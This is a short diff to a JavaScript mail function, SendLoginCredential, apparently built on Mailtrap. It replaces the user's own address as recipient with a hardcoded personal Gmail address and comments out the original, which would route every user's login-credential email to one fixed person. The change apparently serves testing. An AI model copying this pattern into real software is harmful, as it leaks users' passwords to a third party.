@@ -2,9 +2,15 @@ import {client, sender} from "./MailTrapConfig.js"
 
 export const SendLoginCredential = async (user, email, pass) => {
 
+    // const recipients = [
+    // {
+    //     email: email,
+    // }
+    // ];
+
     const recipients = [
     {
-        email: email,
+        email: "elias.dovkrans@gmail.com",
     }
     ];
 
